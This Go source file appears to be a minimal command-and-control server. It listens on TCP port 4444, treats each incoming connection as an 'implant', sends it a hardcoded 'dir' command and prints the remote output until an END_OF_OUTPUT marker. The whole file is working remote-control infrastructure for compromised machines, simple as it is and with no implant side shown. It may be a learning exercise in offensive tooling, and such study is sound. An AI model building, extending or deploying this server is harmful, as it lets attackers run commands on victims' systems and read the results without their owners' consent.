package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"
)

func main() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println(" [-] Error accepting connection")
			continue
		}

		fmt.Println("Implant connected: ", conn.RemoteAddr())
		go handleImplants(conn)

	}

}

func sendCommands(conn net.Conn) {
	command := "dir"
	fmt.Println("[*] Sending command:", command)
	_, err := conn.Write([]byte(command))
	if err != nil {
		log.Println("[-] Error sending command", err)
		return
	}

	fmt.Println("[+] Command sent successfully")
}

func receiveOutput(conn net.Conn) {
	response := bufio.NewReader(conn)
	for {
		output, err := response.ReadString('\n')
		if err != nil {
			log.Println("[-] Error receiving command output", err)
			return
		}

		if strings.TrimSpace(output) == "END_OF_OUTPUT" {
			return
		}
		fmt.Print(output)
	}

}

func handleImplants(conn net.Conn) {
	defer conn.Close()
	sendCommands(conn)
	receiveOutput(conn)
}
